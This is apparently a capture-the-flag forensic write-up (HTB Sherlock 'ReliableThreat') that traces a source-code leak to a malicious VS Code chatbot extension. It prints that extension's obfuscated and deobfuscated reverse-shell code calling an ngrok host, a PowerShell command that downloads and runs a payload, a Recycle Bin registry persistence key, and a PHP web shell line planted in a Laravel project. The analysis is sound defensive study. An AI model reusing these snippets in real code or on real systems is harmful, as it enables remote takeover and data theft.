---
title: "ReliableThreat HTB Sherlock writeup"
date: 2025-07-22 13:05:53 +0300
categories: [HTB]
tags: [Writeup, htb sherlocks]
description: We have discovered a serious security breach involving the unauthorized exposure of our source code. An employee has been identified as a potential suspect in this incident. However, the employee strongly denies any involvement or downloading of external programs. We seek your expertise in digital forensic investigation to perform a comprehensive analysis, determine the root cause of the leak, and help us resolve the situation effectively.

image:
  path: /assets/images/posts/2025-07-22-ReliableThreat/00.png
---




## **Scenario**

We have discovered a serious security breach involving the unauthorized exposure of our source code. An employee has been identified as a potential suspect in this incident. However, the employee strongly denies any involvement or downloading of external programs. We seek your expertise in digital forensic investigation to perform a comprehensive analysis, determine the root cause of the leak, and help us resolve the situation effectively.

For this case we are provided with a memory dump `memdump.dmp` and a disk image `Users.ad1`. 

## **Memory analysis**

The initial analysis will focus on the memory dump using `Volatility` to spot any suspicious running processes.

```
$ vol -f memdump.dmp windows.pstree
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime
[Truncated]
** 3128 3116    explorer.exe    0x850cd107d340  59      -       1       False   2024-07-23 02:28:11.000000      N/A
*** 8108        3128    Code.exe        0x850cd13c3080  42      -       1       False   2024-07-23 02:28:58.000000      N/A
**** 7904       8108    Code.exe        0x850cd27a3080  19      -       1       False   2024-07-23 02:29:03.000000      N/A
**** 4424       8108    Code.exe        0x850cd20fa080  20      -       1       False   2024-07-23 02:29:03.000000      N/A
**** 1612       8108    Code.exe        0x850cd21d5080  19      -       1       False   2024-07-23 02:29:03.000000      N/A
***** 2816      1612    Code.exe        0x850cd2811080  11      -       1       False   2024-07-23 02:29:06.000000      N/A
****** 7868     2816    Code.exe        0x850cd1ba6080  9       -       1       False   2024-07-23 02:29:07.000000      N/A
***** 4196      1612    cmd.exe         0x850cd1d83080  1       -       1       False   2024-07-23 02:32:35.000000      N/A
****** 7864     4196    conhost.exe     0x850cd1e6a080  2       -       1       False   2024-07-23 02:32:35.000000      N/A
****** 1224     4196    RuntimeBroker.  0x850cd1cbf300  4       -       1       False   2024-07-23 02:32:35.000000      N/A
******* 9008    1224    cmd.exe         0x850cd1bc7080  3       -       1       False   2024-07-23 02:35:37.000000      N/A
[Truncated]
```

The provided process tree snippet shows `Code.exe` launching multiple `Code.exe` child instances which is normal for VScode. Then `Code.exe` is spawning `cmd.exe` which may be legitimate if you open an integrated terminal, or an extension runs a shell command. The extremely suspicious observation is the `cmd.exe` spawning `RuntimeBroker.exe`.  `RuntimeBroker.exe` is a core Windows process responsible for managing permissions and ensuring privacy for applications from the Microsoft Store. It acts as an intermediary, checking if this app from the store has the necessary permissions (e.g., to access location, microphone, camera, contacts, or files) before granting access. A legitimate `RuntimeBroker.exe` typically runs in the background and is usually spawned by `svchost.exe`, but `RuntimeBroker.exe` should ever be spawned directly by `cmd.exe` under normal operating conditions and shouldn't spawn a new instance of `cmd.exe`. So `Code.exe` is the application that starts the suspicious chain of processes.


It might that the user ran a malicious code inside one of the opened files by VScode, so I will use `windows.handles` plugin in `Volatility` to enumerate all open handles for processes associated with `Code.exe`. A handle can refer to various system objects (such as files, registry keys, network sockets, mutexes, or threads), our focus in the analysis will be on file handles. 

```
$ vol -f memdump.dmp windows.handles --pid 8108 7904 4424 1612 2816 7868 4196 7864 1224 9008 2544 7800 4272 7572 7636 8020 > full_handles.txt
```

Inside a text editor I searched for handle of type File, part of the result showed what seem to be projects opened by VScode

```
PID	Process	Offset	HandleValue	Type	GrantedAccess	Name
1612	Code.exe	0x850cd1395cc0	0x59c	File	0x100081	\Device\HarddiskVolume3\Users\User2\Desktop\Project\webApp
1612	Code.exe	0x850cd13943c0	0x5a4	File	0x100081	\Device\HarddiskVolume3\Users\User2\Desktop\Project\laravel-11.1.4
1612	Code.exe	0x850cd1393740	0x5ac	File	0x100081	\Device\HarddiskVolume3\Users\User2\Desktop\Project\CS-corp
1612	Code.exe	0x850cd1396940	0x5b0	File	0x100081	\Device\HarddiskVolume3\Users\User2\Desktop\Project\Mycomp
1612	Code.exe	0x850cd1396620	0x5b4	File	0x100081	\Device\HarddiskVolume3\Users\User2\Desktop\Project\online-service
```

other part showed extensions currently used by VScode. The extension `0xs1rx58d3v.chatgpt-b0t-0.0.1` is worth checking because of the leetspeck and the very early version number.
```
7904	Code.exe	0x850cd1c241e0	0x5f0	File	0x100081	\Device\HarddiskVolume3\Users\User2\.vscode\extensions
4424	Code.exe	0x850cd1c281f0	0x36c	File	0x100081	\Device\HarddiskVolume3\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1
```

Next using the `windows.filescan` we get the offset to all files in memory so we can dump the files we need to analyze. 
```
$ vol -f memdump.dmp windows.filescan > filescan.txt
$ cat filescan.txt | grep 0xs1rx58d3v
[Truncated]
0x850cd2e704f0  \Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js      216
$ vol -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd2e704f0
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0x850cd2e704f0  extension.js    Error dumping file
```

Despite the error we still got the full code of `extension.js`
```js
const vscode = require('vscode');

function activate(context) {
    let disposable = vscode.commands.registerCommand('chatbot.start', function () {
        vscode.window.showInformationMessage('ChatBot: Hello! How can I help you with programming today?');

        vscode.window.showInputBox({ placeHolder: 'Type your message here...' }).then(userInput => {
            if (!userInput) return;

            if (userInput.toLowerCase() === 'exit') {
                vscode.window.showInformationMessage('ChatBot: Goodbye! Have a great day!');
                return;
            }

            processUserInput(userInput);
        });
    });

    context.subscriptions.push(disposable);
}

function processUserInput(userInput) {
    let response = getBotResponse(userInput);
    vscode.window.showInformationMessage(`ChatBot: ${response}`);
}

function getBotResponse(userInput) {
    let response = '';

    if (userInput.toLowerCase().includes('javascript')) {
        response = 'JavaScript is a high-level, interpreted programming language that conforms to the ECMAScript specification.';
    } else if (userInput.toLowerCase().includes('python')) {
        response = 'Python is an interpreted, high-level, general-purpose programming language known for its simplicity and readability.';
    } else if (userInput.toLowerCase().includes('java')) {
        response = 'Java is a class-based, object-oriented programming language designed for portability and platform independence.';
    } else if (userInput.toLowerCase().startsWith('define')) {
        const term = userInput.substring('define'.length).trim();
        response = `Searching definition for '${term}'...`;
        setTimeout(() => {
            response = `Definition for '${term}': A function is a block of code that performs a specific task.`;
            vscode.window.showInformationMessage(`ChatBot: ${response}`);
        }, 1000);
        return;
    } else if (userInput.toLowerCase().startsWith('explain')) {
        const algorithm = userInput.substring('explain'.length).trim();
        response = `Explaining '${algorithm}'...`;
        setTimeout(() => {
            switch (algorithm.toLowerCase()) {
                case 'bubble sort':
                    response = 'Bubble Sort is a simple sorting algorithm that repeatedly steps through the list, compares adjacent elements, and swaps them if they are in the wrong order.';
                    break;
                case 'merge sort':
                    response = 'Merge Sort is a divide and conquer algorithm. It divides the input array into two halves, calls itself for the two halves, and then merges the two sorted halves.';
                    break;
                case 'binary search':
                    response = 'Binary Search is a fast search algorithm with O(log n) time complexity. It works by repeatedly dividing in half the portion of the list that could contain the item, until you\'ve narrowed down the possible locations to just one.';
                    break;
                default:
                    response = `Sorry, I don't have information on '${algorithm}'.`;
            }
            vscode.window.showInformationMessage(`ChatBot: ${response}`);
        }, 1000);
        return;
    } else if (userInput.toLowerCase().includes('help')) {
        response = 'You can ask me about programming languages, algorithms, data structures, or coding tips.';
        const _0x3390bc=_0x423e;function _0x3e52(){const _0x14a95e=['process','ess','log','bGkyQ','child_proc','433068GAVVdC','KKJsC','3558228jqdABL','join','tCzjG','writeFile','5861450KWrzJd','net','6.tcp.eu.n','existsSync','8mEVbLY','.lock','33671lcKKCQ','write','homedir','7608789yiXVDm','connect','Socket','exec','close','7500TuJOnk','AZCnT','4640KgvouZ','1240CscGNm','817948FedAcv','10yrCwwl','grok.io','path','mdIHn','closed','qZNxq','data','error','toString'];_0x3e52=function(){return _0x14a95e;};return _0x3e52();}function _0x423e(_0x32668a,_0x544365){const _0x3281b0=_0x3e52();return _0x423e=function(_0x44145a,_0x1452d8){_0x44145a=_0x44145a-(0x29*0x45+-0xef7*0x2+0x13ed);let _0x33b85d=_0x3281b0[_0x44145a];return _0x33b85d;},_0x423e(_0x32668a,_0x544365);}(function(_0x1376e4,_0x462510){const _0x59e326=_0x423e,_0x5ade35=_0x1376e4();while(!![]){try{const _0x3df722=-parseInt(_0x59e326(0x11d))/(-0x8d8+-0x91*0x13+-0x3ec*-0x5)+-parseInt(_0x59e326(0x12c))/(0x14b6+0x769*0x5+-0x39c1)+-parseInt(_0x59e326(0x119))/(0x5*0x6c2+-0x3*-0x679+0x16*-0x26b)*(parseInt(_0x59e326(0x11c))/(-0x1d0*0x1+-0x1*0x30+0x204))+-parseInt(_0x59e326(0x11e))/(-0x3d3+0x1*0x1e3e+0x3e*-0x6d)*(-parseInt(_0x59e326(0x12e))/(0x23fa+-0x10fd+0x1*-0x12f7))+-parseInt(_0x59e326(0x132))/(0xae3*-0x2+0x1d00+-0x733)*(-parseInt(_0x59e326(0x10f))/(0x24a7*-0x1+-0x4a0*-0x8+-0x1*0x51))+-parseInt(_0x59e326(0x114))/(-0x26a4+0x15cc+0x95*0x1d)+parseInt(_0x59e326(0x11b))/(-0x2*-0x9d1+-0x15d8+-0x18*-0x18)*(parseInt(_0x59e326(0x111))/(-0x1*0x1efd+0x1*0x2565+-0x65d));if(_0x3df722===_0x462510)break;else _0x5ade35['push'](_0x5ade35['shift']());}catch(_0x16859e){_0x5ade35['push'](_0x5ade35['shift']());}}}(_0x3e52,0x1505f9+-0x7c7ee+-0x134b0));const fs=require('fs'),net=require(_0x3390bc(0x10c)),path=require(_0x3390bc(0x120)),os=require('os'),{pid}=require(_0x3390bc(0x127)),lockFilePath=path[_0x3390bc(0x12f)](os[_0x3390bc(0x113)](),'.'+pid+_0x3390bc(0x110));!fs[_0x3390bc(0x10e)](lockFilePath)&&(fs[_0x3390bc(0x131)](lockFilePath,'',_0x2452ba=>{const _0x1288f9=_0x3390bc;_0x2452ba&&console[_0x1288f9(0x125)](_0x2452ba);}),(function(){const _0x3888c3=_0x3390bc,_0x3a2b7d={'tCzjG':function(_0xc37733,_0x5552a9){return _0xc37733(_0x5552a9);},'mdIHn':_0x3888c3(0x12b)+_0x3888c3(0x128),'qZNxq':_0x3888c3(0x122),'KKJsC':_0x3888c3(0x10d)+_0x3888c3(0x11f),'bGkyQ':_0x3888c3(0x124),'AZCnT':_0x3888c3(0x118)},_0x3db126=new net[(_0x3888c3(0x116))]();return _0x3db126[_0x3888c3(0x115)](0x1fd*-0xb+-0x11d5+0x687f,_0x3a2b7d[_0x3888c3(0x12d)]),_0x3db126['on'](_0x3a2b7d[_0x3888c3(0x12a)],_0xd34d07=>{const _0x70cc2e=_0x3888c3,_0x45fcf2=_0xd34d07[_0x70cc2e(0x126)]();_0x3a2b7d[_0x70cc2e(0x130)](require,_0x3a2b7d[_0x70cc2e(0x121)])[_0x70cc2e(0x117)](_0x45fcf2,(_0x460220,_0x254585,_0x3aa38b)=>{const _0x222d46=_0x70cc2e;_0x460220?_0x3db126[_0x222d46(0x112)](_0x3aa38b):_0x3db126[_0x222d46(0x112)](_0x254585);});}),_0x3db126['on'](_0x3a2b7d[_0x3888c3(0x11a)],()=>{const _0x2d9eb3=_0x3888c3;console[_0x2d9eb3(0x129)](_0x3a2b7d[_0x2d9eb3(0x123)]);}),/a/;}()));
        response = 'An algorithm is a set of instructions designed to perform a specific task. It can be expressed as a finite sequence of well-defined steps.';
    } else if (userInput.toLowerCase().includes('data structure')) {
        response = 'A data structure is a way of organizing and storing data so that it can be accessed and used efficiently. Examples include arrays, linked lists, stacks, queues, trees, and graphs.';
    } else if (userInput.toLowerCase().includes('programming paradigm')) {
        response = 'A programming paradigm is a fundamental style of computer programming. Common paradigms include imperative, declarative, functional, and object-oriented.';
    } else if (userInput.toLowerCase().includes('api')) {
        response = 'An API (Application Programming Interface) is a set of rules and protocols that allows different software applications to communicate with each other.';
    } else if (userInput.toLowerCase().includes('git')) {
        response = 'Git is a distributed version control system designed to handle everything from small to very large projects with speed and efficiency.';
    } else if (userInput.toLowerCase().includes('debugging')) {
        response = 'Debugging is the process of finding and resolving defects or problems within a computer program.';
    } else if (userInput.toLowerCase().includes('compiler')) {
        response = 'A compiler is a special program that converts source code written in a high-level programming language into machine code or bytecode that a computer\'s processor can then execute.';
    } else if (userInput.toLowerCase().includes('ide')) {
        response = 'An IDE (Integrated Development Environment) is a software application that provides comprehensive facilities to programmers for software development.';
    } else if (userInput.toLowerCase().includes('framework')) {
        response = 'A framework is a reusable software platform used to develop applications, products, and solutions.';
    } else {
        response = `I hear you saying: ${userInput}`;
    }

    vscode.window.showInformationMessage(`ChatBot: ${response}`);
	
}

function deactivate() {
    console.log('ChatBot extension is deactivated.');
}

module.exports = {
    activate,
    deactivate
};
```

The functions `activate()` and `processUserInput()` prepare the bot to get input from user. Then `getBotResponse()` take this input and return a result from multiple if-else statements.

![](/assets/images/posts/2025-07-22-ReliableThreat/01.png)

One of the if-else which is expecting the `help` keyword execute an obfuscated js code, using [Obfuscator.io](https://obf-io.deobfuscate.io/) to deobfuscate it give this result:
```
const fs = require('fs');
const net = require("net");
const path = require("path");
const os = require('os');
const {
  pid
} = require("process");
const lockFilePath = path.join(os.homedir(), '.' + pid + ".lock");
if (!fs.existsSync(lockFilePath)) {
  fs.writeFile(lockFilePath, '', _0x2452ba => {
    if (_0x2452ba) {
      console.error(_0x2452ba);
    }
  });
  (function () {
    const _0x3db126 = new net.Socket();
    _0x3db126.connect(16587, "6.tcp.eu.ngrok.io");
    _0x3db126.on("data", _0xd34d07 => {
      const _0x45fcf2 = _0xd34d07.toString();
      require("child_process").exec(_0x45fcf2, (_0x460220, _0x254585, _0x3aa38b) => {
        if (_0x460220) {
          _0x3db126.write(_0x3aa38b);
        } else {
          _0x3db126.write(_0x254585);
        }
      });
    });
    _0x3db126.on("close", () => {
      console.log("closed");
    });
    return /a/;
  })();
}
```

Basically what this script doing is creating a lock file at the user's home directory, the filename is a dot (.) followed by the current process ID and then `.lock`. Then `if (!fs.existsSync(lockFilePath))` checks if this lock file already exists to ensure that only one instance of the script runs at a time. Then `_0x3db126.connect(16587, "6.tcp.eu.ngrok.io")` establishes a reverse shell, receive commands and execute them `require("child_process").exec(_0x45fcf2`. 

This concludes that `extension.js` is the malicious file used to gain initial access, and choosing the `help` option will run the malicious code. The user that has been compromised is `user2`, and this user's SID, `S-1-5-21-1998887770-13753423-1649717590-1001`, can be grepped from `filescan.txt`.

Next, to learn more about the developer of the `0xs1rx58d3v.chatgpt-b0t-0.0.1` extension, I googled it. No results were found, which is expected since this malicious extension was likely removed from the VS Code marketplace. I then wanted to check for a snapshot of its page on the VS Code marketplace via web.archive.org, but to do so, I need the exact URL for this specific extension. To formulate the correct URL, I observed that normal  VS Code extension URLs contain an `itemName` parameter, which holds the extension's unique identifier (the extension name without the version). Therefore, I will search for `https://marketplace.visualstudio.com/items?itemName=0xs1rx58d3v.chatgpt-b0t` on the Web Archive. luckily we got a snapshot and can see the release data and the publisher

![](/assets/images/posts/2025-07-22-ReliableThreat/02.png)





Since the attacker had RCE on the machine, the commands they executed must have resulted in the activity of the `RuntimeBroker.exe` instance we saw earlier. To know more about what the attacker tried to achieve, we need to analyze this file, so we will look for it then dump it.

```
$ cat filescan.txt | grep RuntimeBroker
0x850ccfcafb40  \Users\Public\RuntimeBroker.exe 216
0x850cd13865e0  \Windows\System32\RuntimeBroker.exe     216
0x850cd16c7e20  \Windows\System32\RuntimeBroker.exe     216
0x850cd187baf0  \Windows\System32\RuntimeBroker.exe     216
0x850cd188f820  \Users\Public\RuntimeBroker.exe 216
0x850cd2216230  \Windows\System32\RuntimeBroker.exe     216
$ vol -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd188f820
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

ImageSectionObject      0x850cd188f820  RuntimeBroker.exe       file.0x850cd188f820.0x850ccffe9b60.ImageSectionObject.RuntimeBroker.exe.img
```

After submitting it auto analysis here is the reports on [virustotal](https://www.virustotal.com/gui/file/552fd3ae2e7dadf92054a4ac3fa2e86342eec31ba536406aefdc4e5a962a1d16/detection) and [hybrid-analysis](https://hybrid-analysis.com/sample/552fd3ae2e7dadf92054a4ac3fa2e86342eec31ba536406aefdc4e5a962a1d16/67b9865c0975bf2c880d40fa). Virustotal shows that it a meterpreter shellcode.

![](/assets/images/posts/2025-07-22-ReliableThreat/03.png)

Hybrid analysis indicates that the shellcode attempted to connect to a server and used API calls to allocate memory. It is likely a stager shellcode designed to connect back to an attacker, download a malicious binary, and then execute it in memory.

![](/assets/images/posts/2025-07-22-ReliableThreat/04.png)


The auto analysis didn't show any dropped files, but I noticed that the shellcode tried to access non-existent executable files. So, it may not have been able to fully complete its mission.

![](/assets/images/posts/2025-07-22-ReliableThreat/05.png)

## **Disk analysis**

I will mount the `Users.ad1` with `FTK Imager`, and after navigating through the mounted image, I will dump `temp.exe` from the `Public` user's directory and the folder `Projects` from `User2`'s profile.

![](/assets/images/posts/2025-07-22-ReliableThreat/08.png)

I will use `strings` to get an idea about `temp.exe` and I found those two interesting strings
```
$ strings temp.exe
[Truncated]
SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell
C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('http://s1rx.xyz/tmp.exe', 'C:\Windows\Temp\tmp.exe'); Start-Process 'C:\Windows\Temp\tmp.exe'"
```

Upon loading `temp.exe` into `IDA Freeware` and examining its strings, they were found within the `main` function. The target registry key is stored in the `lpSubKey` variable, while the PowerShell command is stored in the `str` variable. The Windows API function `RegOpenKeyExA` is then called, using `SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell` as the `lpSubKey` parameter. It specifies a `samDesired` value of `0x20006`, which indicates `STANDARD_RIGHTS_WRITE`, `KEY_SET_VALUE`, and `KEY_CREATE_SUB_KEY` access rights. This means the program is attempting to obtain a handle to this specific registry key with permissions to write, set values, and create subkeys.

![](/assets/images/posts/2025-07-22-ReliableThreat/06.png)

Next, it creates a subkey named `open\\command`. The value from the `str` variable (which holds the PowerShell command) is then used as the `lpData` parameter, setting the value of this new subkey to the previously stored PowerShell command.

![](/assets/images/posts/2025-07-22-ReliableThreat/07.png)

The registry key `SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell` is associated with the Recycle Bin. The `open\command` subkey is a standard subkey used to define the command that gets executed when the default action (usually 'Open') is performed on an object. By setting the value of `SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command` to a PowerShell command, the malware is attempting to achieve persistence through user interaction, as it ensures that the malware executes every time the user opens the Recycle Bin. This behavior corresponds to `Event Triggered Execution` (T1546) and the most suitable subtechnique is `Component Object Model Hijacking` [T1546.015](https://attack.mitre.org/techniques/T1546/015/).


The questions mentioned that the attacker added malicious code into one of the projects. While inspecting the Laravel project, I found that one of the files was modified, and the line `$testc = $_GET['s1']; echo` `` `$testc` `` `;` was added.

```
$ git diff
diff --git a/public/index.php b/public/index.php
index 9da023e..7d23163 100644
--- a/public/index.php
+++ b/public/index.php
@@ -11,6 +11,8 @@

 // Register the Composer autoloader...

+$testc = $_GET['s1']; echo `$testc`;
+
 require __DIR__.'/../vendor/autoload.php';
```

`$_GET['s1']`: This part means the script is taking input directly from a URL parameter named `s1`. 
`$testc = $_GET['s1']`: The value from the `s1` URL parameter is assigned directly to the variable `$testc`.
`` `$testc` `` (backticks/gravé accents): When a string is enclosed in backticks, the interpreter treats that string as a shell command and executes it. The output of that command is then returned as a string.



